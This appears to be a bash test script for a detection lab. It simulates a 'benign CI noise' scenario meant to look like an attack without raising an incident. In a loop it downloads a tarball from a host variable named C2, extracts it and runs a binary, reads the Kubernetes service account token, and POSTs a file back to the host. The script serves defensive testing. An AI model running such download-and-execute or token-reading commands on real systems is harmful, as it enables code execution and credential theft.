#!/usr/bin/env bash
# S4 benign-ci-noise（VM 拓扑版）：完全合法的 CI 构建，行为与攻击高度相似。
# 断言：Incident=0（罕见度而非裸加）。
# 注意:本脚本在 node-a VM 内执行(capture-vm.sh 通过 vagrant ssh 调用),不要再用 vagrant ssh。
set -euo pipefail
C2="${C2:-10.66.0.99}"
CYCLES="${CYCLES:-3}"

for i in $(seq 1 "$CYCLES"); do
  curl -s http://$C2:8080/deps.tar -o /tmp/deps.tar || true
  mkdir -p /tmp/build && tar xf /tmp/deps.tar -C /tmp/build 2>/dev/null || true
  cp /tmp/build/tool /tmp/tool && chmod +x /tmp/tool 2>/dev/null || true
  /tmp/tool --build 2>/dev/null || true
  cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 || true
  curl -s -X POST --data-binary @/tmp/tool http://$C2:8080/upload -o /dev/null || true
done
echo "[benign-ci-noise] ran $CYCLES benign build cycles (vm)"
